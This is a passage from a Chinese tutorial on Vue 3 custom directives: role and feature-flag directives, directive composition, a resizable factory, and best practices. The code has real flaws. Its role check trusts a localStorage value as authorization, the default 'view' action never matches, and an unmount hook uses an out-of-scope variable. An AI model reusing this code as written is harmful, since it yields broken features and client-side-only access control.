          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">remove</span>) {
            el.<span class="hljs-property">parentNode</span>?.<span class="hljs-title function_">removeChild</span>(el)
          }
        }
        
        <span class="hljs-comment">// 更新权限信息</span>
        el.<span class="hljs-property">_permissionInfo</span> = {
          <span class="hljs-attr">required</span>: newValue,
          userRole,
          hasPermission,
          <span class="hljs-attr">action</span>: binding.<span class="hljs-property">arg</span> || <span class="hljs-string">'view'</span>
        }
      }
    },
    
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-comment">// 清理</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_permissionInfo</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_originalDisplay</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_originalDisabled</span>
    }
  },
  
  <span class="hljs-comment">// 功能权限指令</span>
  <span class="hljs-attr">feature</span>: {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> { value, modifiers } = binding
      
      <span class="hljs-comment">// 检查功能是否启用</span>
      <span class="hljs-keyword">const</span> isEnabled = <span class="hljs-title function_">checkFeatureEnabled</span>(value)
      
      <span class="hljs-keyword">if</span> (!isEnabled) {
        <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">hide</span>) {
          el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">disable</span>) {
          el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>
          el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'disabled'</span>)
        } <span class="hljs-keyword">else</span> {
          el.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'0.5'</span>
          el.<span class="hljs-property">style</span>.<span class="hljs-property">pointerEvents</span> = <span class="hljs-string">'none'</span>
        }
      }
      
      el.<span class="hljs-property">_featureInfo</span> = {
        <span class="hljs-attr">feature</span>: value,
        <span class="hljs-attr">enabled</span>: isEnabled
      }
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> isEnabled = <span class="hljs-title function_">checkFeatureEnabled</span>(binding.<span class="hljs-property">value</span>)
      
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_featureInfo</span>.<span class="hljs-property">enabled</span> !== isEnabled) {
        <span class="hljs-keyword">if</span> (isEnabled) {
          <span class="hljs-comment">// 恢复</span>
          <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">hide</span>) {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">''</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">disable</span>) {
            el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>
            el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'disabled'</span>)
          } <span class="hljs-keyword">else</span> {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">''</span>
            el.<span class="hljs-property">style</span>.<span class="hljs-property">pointerEvents</span> = <span class="hljs-string">''</span>
          }
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// 禁用</span>
          <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">hide</span>) {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">disable</span>) {
            el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>
            el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'disabled'</span>)
          } <span class="hljs-keyword">else</span> {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'0.5'</span>
            el.<span class="hljs-property">style</span>.<span class="hljs-property">pointerEvents</span> = <span class="hljs-string">'none'</span>
          }
        }
        
        el.<span class="hljs-property">_featureInfo</span> = {
          <span class="hljs-attr">feature</span>: binding.<span class="hljs-property">value</span>,
          <span class="hljs-attr">enabled</span>: isEnabled
        }
      }
    },
    
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_featureInfo</span>
    }
  }
}

<span class="hljs-comment">// 工具函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getCurrentUserRole</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 从Vuex、Pinia或localStorage获取</span>
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'userRole'</span>) || <span class="hljs-string">'guest'</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkRolePermission</span>(<span class="hljs-params">userRole, required, action = <span class="hljs-string">'view'</span></span>) {
  <span class="hljs-comment">// 权限配置</span>
  <span class="hljs-keyword">const</span> permissions = {
    <span class="hljs-attr">admin</span>: [<span class="hljs-string">'create'</span>, <span class="hljs-string">'read'</span>, <span class="hljs-string">'update'</span>, <span class="hljs-string">'delete'</span>, <span class="hljs-string">'manage'</span>],
    <span class="hljs-attr">editor</span>: [<span class="hljs-string">'create'</span>, <span class="hljs-string">'read'</span>, <span class="hljs-string">'update'</span>],
    <span class="hljs-attr">viewer</span>: [<span class="hljs-string">'read'</span>],
    <span class="hljs-attr">guest</span>: []
  }
  
  <span class="hljs-comment">// 如果是数组，检查任意一个</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(required)) {
    <span class="hljs-keyword">return</span> required.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">role</span> =&gt;</span> 
      permissions[userRole]?.<span class="hljs-title function_">includes</span>(action) &amp;&amp; role === userRole
    )
  }
  
  <span class="hljs-comment">// 如果是字符串，精确匹配</span>
  <span class="hljs-keyword">return</span> permissions[userRole]?.<span class="hljs-title function_">includes</span>(action) &amp;&amp; required === userRole
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFeatureEnabled</span>(<span class="hljs-params">feature</span>) {
  <span class="hljs-comment">// 从配置或特性开关获取</span>
  <span class="hljs-keyword">const</span> featureFlags = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'featureFlags'</span>) || <span class="hljs-string">'{}'</span>)
  <span class="hljs-keyword">return</span> featureFlags[feature] !== <span class="hljs-literal">false</span>
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-comment">// &lt;button v-role="'admin'"&gt;仅管理员可见&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-role="['admin', 'editor']"&gt;管理员和编辑可见&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-role:edit="'admin'"&gt;管理员可编辑&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-role.hide="'admin'"&gt;非管理员隐藏&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-role.disable="'admin'"&gt;非管理员禁用&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;div v-feature="'newUI'"&gt;新UI功能&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-feature.disable="'betaFeature'"&gt;测试功能&lt;/div&gt;</span>
</code></pre>
<h3 data-id="heading-13">四、指令组合与复用</h3>
<h4 data-id="heading-14">4.1 指令组合器</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 指令组合器：将多个指令组合成一个</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDirectiveComposer</span>(<span class="hljs-params">...directives</span>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">beforeMount</span>) directive.<span class="hljs-title function_">beforeMount</span>(...args)
      })
    },
    
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">mounted</span>) directive.<span class="hljs-title function_">mounted</span>(...args)
      })
    },
    
    <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">beforeUpdate</span>) directive.<span class="hljs-title function_">beforeUpdate</span>(...args)
      })
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">updated</span>) directive.<span class="hljs-title function_">updated</span>(...args)
      })
    },
    
    <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">beforeUnmount</span>) directive.<span class="hljs-title function_">beforeUnmount</span>(...args)
      })
    },
    
    <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">...args</span>) {
      directives.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">directive</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (directive.<span class="hljs-property">unmounted</span>) directive.<span class="hljs-title function_">unmounted</span>(...args)
      })
    }
  }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> vTooltip = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">title</span> = binding.<span class="hljs-property">value</span>
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'has-tooltip'</span>)
  },
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'has-tooltip'</span>)
  }
}

<span class="hljs-keyword">const</span> vHighlight = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span>) {
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'highlight'</span>)
    }
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span>) {
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'highlight'</span>)
    } <span class="hljs-keyword">else</span> {
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'highlight'</span>)
    }
  }
}

<span class="hljs-comment">// 组合指令</span>
<span class="hljs-keyword">const</span> vTooltipHighlight = <span class="hljs-title function_">createDirectiveComposer</span>(vTooltip, vHighlight)

<span class="hljs-comment">// 注册</span>
app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'tooltip-highlight'</span>, vTooltipHighlight)

<span class="hljs-comment">// 使用</span>
<span class="hljs-comment">// &lt;div v-tooltip-highlight="'提示文本'"&gt;内容&lt;/div&gt;</span>
</code></pre>
<h4 data-id="heading-15">4.2 指令工厂函数</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 指令工厂：创建可配置的指令</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createResizableDirective</span>(<span class="hljs-params">options = {}</span>) {
  <span class="hljs-keyword">const</span> defaultOptions = {
    <span class="hljs-attr">handles</span>: [<span class="hljs-string">'right'</span>, <span class="hljs-string">'bottom'</span>, <span class="hljs-string">'bottom-right'</span>],
    <span class="hljs-attr">minWidth</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">minHeight</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">maxWidth</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">maxHeight</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">onResize</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">onResizeStart</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">onResizeEnd</span>: <span class="hljs-literal">null</span>
  }
  
  <span class="hljs-keyword">const</span> config = { ...defaultOptions, ...options }
  
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> instanceOptions = <span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'object'</span> 
        ? { ...config, ...binding.<span class="hljs-property">value</span> }
        : config
      
      <span class="hljs-comment">// 创建调整大小的手柄</span>
      <span class="hljs-keyword">const</span> handles = instanceOptions.<span class="hljs-property">handles</span>
      <span class="hljs-keyword">const</span> handleElements = []
      
      handles.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">handle</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> handleEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>)
        handleEl.<span class="hljs-property">className</span> = <span class="hljs-string">`resize-handle resize-handle-<span class="hljs-subst">${handle}</span>`</span>
        handleEl.<span class="hljs-property">dataset</span>.<span class="hljs-property">handle</span> = handle
        
        <span class="hljs-comment">// 添加事件监听</span>
        handleEl.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousedown'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
          e.<span class="hljs-title function_">preventDefault</span>()
          e.<span class="hljs-title function_">stopPropagation</span>()
          <span class="hljs-title function_">startResize</span>(e, handle, el, instanceOptions)
        })
        
        el.<span class="hljs-title function_">appendChild</span>(handleEl)
        handleElements.<span class="hljs-title function_">push</span>(handleEl)
      })
      
      <span class="hljs-comment">// 存储引用</span>
      el.<span class="hljs-property">_resizeHandles</span> = handleElements
      el.<span class="hljs-property">_resizeOptions</span> = instanceOptions
      
      <span class="hljs-comment">// 添加可调整大小的样式</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'resizable'</span>)
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-comment">// 更新选项</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'object'</span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(el.<span class="hljs-property">_resizeOptions</span>, binding.<span class="hljs-property">value</span>)
      }
    },
    
    <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-comment">// 清理手柄</span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_resizeHandles</span>) {
        el.<span class="hljs-property">_resizeHandles</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">handle</span> =&gt;</span> {
          handle.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousedown'</span>, handle.<span class="hljs-property">_resizeHandler</span>)
          el.<span class="hljs-title function_">removeChild</span>(handle)
        })
        <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_resizeHandles</span>
      }
      
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_resizeOptions</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'resizable'</span>)
    }
  }
}

<span class="hljs-comment">// 调整大小逻辑</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">startResize</span>(<span class="hljs-params">e, handle, el, options</span>) {
  <span class="hljs-keyword">const</span> startX = e.<span class="hljs-property">clientX</span>
  <span class="hljs-keyword">const</span> startY = e.<span class="hljs-property">clientY</span>
  <span class="hljs-keyword">const</span> startWidth = el.<span class="hljs-property">offsetWidth</span>
  <span class="hljs-keyword">const</span> startHeight = el.<span class="hljs-property">offsetHeight</span>
  
  <span class="hljs-comment">// 触发开始回调</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options.<span class="hljs-property">onResizeStart</span> === <span class="hljs-string">'function'</span>) {
    options.<span class="hljs-title function_">onResizeStart</span>(e, el, { <span class="hljs-attr">width</span>: startWidth, <span class="hljs-attr">height</span>: startHeight })
  }
  
  <span class="hljs-comment">// 鼠标移动处理</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onMouseMove</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-keyword">const</span> deltaX = e.<span class="hljs-property">clientX</span> - startX
    <span class="hljs-keyword">const</span> deltaY = e.<span class="hljs-property">clientY</span> - startY
    
    <span class="hljs-keyword">let</span> newWidth = startWidth
    <span class="hljs-keyword">let</span> newHeight = startHeight
    
    <span class="hljs-comment">// 根据手柄类型计算新尺寸</span>
    <span class="hljs-keyword">if</span> (handle.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'right'</span>)) {
      newWidth = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(options.<span class="hljs-property">minWidth</span>, startWidth + deltaX)
      <span class="hljs-keyword">if</span> (options.<span class="hljs-property">maxWidth</span>) {
        newWidth = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(options.<span class="hljs-property">maxWidth</span>, newWidth)
      }
    }
    
    <span class="hljs-keyword">if</span> (handle.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'bottom'</span>)) {
      newHeight = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(options.<span class="hljs-property">minHeight</span>, startHeight + deltaY)
      <span class="hljs-keyword">if</span> (options.<span class="hljs-property">maxHeight</span>) {
        newHeight = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(options.<span class="hljs-property">maxHeight</span>, newHeight)
      }
    }
    
    <span class="hljs-comment">// 应用新尺寸</span>
    el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">`<span class="hljs-subst">${newWidth}</span>px`</span>
    el.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = <span class="hljs-string">`<span class="hljs-subst">${newHeight}</span>px`</span>
    
    <span class="hljs-comment">// 触发调整回调</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options.<span class="hljs-property">onResize</span> === <span class="hljs-string">'function'</span>) {
      options.<span class="hljs-title function_">onResize</span>(e, el, { <span class="hljs-attr">width</span>: newWidth, <span class="hljs-attr">height</span>: newHeight })
    }
  }
  
  <span class="hljs-comment">// 鼠标抬起处理</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onMouseUp</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousemove'</span>, onMouseMove)
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mouseup'</span>, onMouseUp)
    
    <span class="hljs-comment">// 触发结束回调</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options.<span class="hljs-property">onResizeEnd</span> === <span class="hljs-string">'function'</span>) {
      options.<span class="hljs-title function_">onResizeEnd</span>(e, el, {
        <span class="hljs-attr">width</span>: el.<span class="hljs-property">offsetWidth</span>,
        <span class="hljs-attr">height</span>: el.<span class="hljs-property">offsetHeight</span>
      })
    }
  }
  
  <span class="hljs-comment">// 添加全局事件监听</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, onMouseMove)
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mouseup'</span>, onMouseUp)
}

<span class="hljs-comment">// 创建不同配置的指令</span>
<span class="hljs-keyword">const</span> vResizable = <span class="hljs-title function_">createResizableDirective</span>()
<span class="hljs-keyword">const</span> vResizableHorizontal = <span class="hljs-title function_">createResizableDirective</span>({ <span class="hljs-attr">handles</span>: [<span class="hljs-string">'right'</span>] })
<span class="hljs-keyword">const</span> vResizableVertical = <span class="hljs-title function_">createResizableDirective</span>({ <span class="hljs-attr">handles</span>: [<span class="hljs-string">'bottom'</span>] })

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-comment">// &lt;div v-resizable&gt;可调整大小&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-resizable="{ minWidth: 200, maxWidth: 800, onResize: handleResize }"&gt;</span>
<span class="hljs-comment">// &lt;div v-resizable.horizontal&gt;仅水平调整&lt;/div&gt;</span>
</code></pre>
<h3 data-id="heading-16">五、最佳实践与注意事项</h3>
<h4 data-id="heading-17">5.1 性能优化</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 使用防抖和节流</span>
<span class="hljs-keyword">import</span> { debounce, throttle } <span class="hljs-keyword">from</span> <span class="hljs-string">'lodash'</span>

<span class="hljs-keyword">const</span> vScrollOptimized = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> handler = binding.<span class="hljs-property">value</span>
    
    <span class="hljs-comment">// 使用防抖</span>
    <span class="hljs-keyword">const</span> debouncedHandler = <span class="hljs-title function_">debounce</span>(handler, <span class="hljs-number">300</span>, {
      <span class="hljs-attr">leading</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">trailing</span>: <span class="hljs-literal">true</span>
    })
    
    <span class="hljs-comment">// 使用节流</span>
    <span class="hljs-keyword">const</span> throttledHandler = <span class="hljs-title function_">throttle</span>(handler, <span class="hljs-number">100</span>)
    
    el.<span class="hljs-property">_scrollHandler</span> = binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">debounce</span> 
      ? debouncedHandler
      : binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">throttle</span>
        ? throttledHandler
        : handler
    
    el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, el.<span class="hljs-property">_scrollHandler</span>)
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, el.<span class="hljs-property">_scrollHandler</span>)
  }
}

<span class="hljs-comment">// 2. 事件委托</span>
<span class="hljs-keyword">const</span> vEventDelegation = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> eventType = binding.<span class="hljs-property">arg</span> || <span class="hljs-string">'click'</span>
    <span class="hljs-keyword">const</span> selector = binding.<span class="hljs-property">value</span>.<span class="hljs-property">selector</span>
    <span class="hljs-keyword">const</span> handler = binding.<span class="hljs-property">value</span>.<span class="hljs-property">handler</span>
    
    el.<span class="hljs-property">_delegationHandler</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-comment">// 检查事件目标是否匹配选择器</span>
      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-title function_">matches</span>(selector) || e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(selector)) {
        <span class="hljs-title function_">handler</span>(e)
      }
    }
    
    el.<span class="hljs-title function_">addEventListener</span>(eventType, el.<span class="hljs-property">_delegationHandler</span>)
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-title function_">removeEventListener</span>(binding.<span class="hljs-property">arg</span> || <span class="hljs-string">'click'</span>, el.<span class="hljs-property">_delegationHandler</span>)
  }
}

<span class="hljs-comment">// 3. 指令复用</span>
<span class="hljs-comment">// 创建可复用的基础指令</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">baseDirective</span> = (<span class="hljs-params">customHooks = {}</span>) =&gt; ({
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding, vnode</span>) {
    <span class="hljs-comment">// 公共前置逻辑</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'指令绑定到元素:'</span>, el.<span class="hljs-property">tagName</span>)
    
    <span class="hljs-comment">// 调用自定义钩子</span>
    <span class="hljs-keyword">if</span> (customHooks.<span class="hljs-property">beforeMount</span>) {
      customHooks.<span class="hljs-title function_">beforeMount</span>(el, binding, vnode)
    }
  },
  
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding, vnode</span>) {
    <span class="hljs-comment">// 公共逻辑</span>
    el.<span class="hljs-property">dataset</span>.<span class="hljs-property">directiveMounted</span> = <span class="hljs-string">'true'</span>
    
    <span class="hljs-comment">// 调用自定义钩子</span>
    <span class="hljs-keyword">if</span> (customHooks.<span class="hljs-property">mounted</span>) {
      customHooks.<span class="hljs-title function_">mounted</span>(el, binding, vnode)
    }
  },
  
  <span class="hljs-comment">// ... 其他钩子</span>
})

<span class="hljs-comment">// 创建特定指令</span>
<span class="hljs-keyword">const</span> vCustomDirective = <span class="hljs-title function_">baseDirective</span>({
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// 特定逻辑</span>
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  }
})
</code></pre>
<h4 data-id="heading-18">5.2 错误处理</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 指令错误处理</span>
<span class="hljs-keyword">const</span> vSafeDirective = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 可能出错的操作</span>
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(binding.<span class="hljs-property">value</span>)
      el.<span class="hljs-property">_parsedData</span> = result
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// 错误处理</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'指令执行错误:'</span>, error)
      
      <span class="hljs-comment">// 显示错误状态</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'directive-error'</span>)
      el.<span class="hljs-property">title</span> = <span class="hljs-string">`指令错误: <span class="hljs-subst">${error.message}</span>`</span>
      
      <span class="hljs-comment">// 触发错误事件</span>
      el.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'directive-error'</span>, {
        <span class="hljs-attr">detail</span>: { error, binding }
      }))
    }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// 检查值是否有效</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span> === <span class="hljs-literal">undefined</span> || binding.<span class="hljs-property">value</span> === <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'指令接收到无效值'</span>)
      <span class="hljs-keyword">return</span>
    }
    
    <span class="hljs-comment">// 继续执行</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">mounted</span>(el, binding)
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-comment">// 清理</span>
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'directive-error'</span>)
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_parsedData</span>
  }
}
</code></pre>
<h3 data-id="heading-19">六、总结</h3>
<h4 data-id="heading-20">6.1 生命周期钩子关键点</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 记忆口诀</span>
<span class="hljs-keyword">const</span> directiveLifecycle = <span class="hljs-string">`
口诀一：
挂载前准备（beforeMount）
挂载后执行（mounted）
更新前检查（beforeUpdate）
更新后响应（updated）
卸载前清理（beforeUnmount）
卸载后释放（unmounted）

口诀二：
绑定看 beforeMount + mounted
更新看 beforeUpdate + updated
解绑看 beforeUnmount + unmounted

口诀三：
Vue2 转 Vue3：
bind → beforeMount
inserted → mounted
update → beforeUpdate
componentUpdated → updated
unbind → beforeUnmount + unmounted
`</span>

<span class="hljs-comment">// 使用建议</span>
<span class="hljs-keyword">const</span> bestPractices = <span class="hljs-string">`
1. 在 mounted 中操作 DOM
2. 在 updated 中响应数据变化
3. 在 beforeUnmount/unmounted 中清理资源
4. 使用指令参数和修饰符增强功能
5. 考虑性能，合理使用事件监听
6. 保持指令的单一职责
7. 添加错误处理
8. 提供清理函数避免内存泄漏
`</span>
</code></pre>
<h4 data-id="heading-21">6.2 完整示例：图片懒加载指令</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> vLazyLoad = {
